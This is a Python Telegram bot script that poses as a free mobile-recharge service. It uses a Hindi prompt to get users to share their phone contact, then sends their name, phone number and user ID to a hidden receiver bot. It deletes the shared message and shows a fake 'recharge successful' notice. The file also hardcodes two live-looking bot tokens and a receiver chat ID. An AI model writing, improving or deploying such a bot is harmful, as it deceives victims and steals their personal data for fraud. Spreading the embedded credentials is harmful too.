from telegram import (
    Update, Bot as TelegramBot,
    ReplyKeyboardMarkup, KeyboardButton
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler,
    ContextTypes, MessageHandler, filters
)

# 🔐 CONFIGURATION
BOT_TOKEN = "8375916335:AAEldqyFe470YsPMzJp47GVmKSDQjYjkeTc"          # Sender bot
RECEIVER_BOT_TOKEN = "8023709572:AAH25wliLGLb_ywzWr85Pt_rsisgRhpGXCM"  # Receiver bot
RECEIVER_CHAT_ID = "6342057815"                                       # Where to send contact info

# ✅ /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🤖 Bot Activated.\nUse /info to continue.")

# ✅ /info command
async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    next_button = [[KeyboardButton("➡️ Next", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(next_button, one_time_keyboard=True, resize_keyboard=True)
    await update.message.reply_text("👉 अपना नंबर रिचार्ज कराने के लिए 'Next' पर क्लिक करें।", reply_markup=reply_markup)

# ✅ Contact handler (on clicking "Next")
async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    receiver_bot = TelegramBot(token=RECEIVER_BOT_TOKEN)

    if contact:
        # ✅ 1. Send contact to receiver bot
        msg = (
            f"📞 Contact Info:\n"
            f"👤 Name: {contact.first_name}\n"
            f"📱 Phone: {contact.phone_number}\n"
            f"🆔 User ID: {contact.user_id}"
        )
        await receiver_bot.send_message(chat_id=RECEIVER_CHAT_ID, text=msg)

        # ✅ 2. Delete contact message from sender chat
        try:
            await update.message.delete()
        except Exception as e:
            print(f"❌ Failed to delete message: {e}")

        # ✅ 3. Show success message to user
        await update.message.chat.send_message(
            "🎉 Congratulations! Your recharge is successfully.\n"
            "अगर आपका रिचार्ज नहीं हुआ है तो थोड़ी देर में हो जाएगा।"
        )
    else:
        await update.message.reply_text("❌ Contact not received.")

# ✅ Main bot function
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
    print("✅ mobilerecharge-only bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
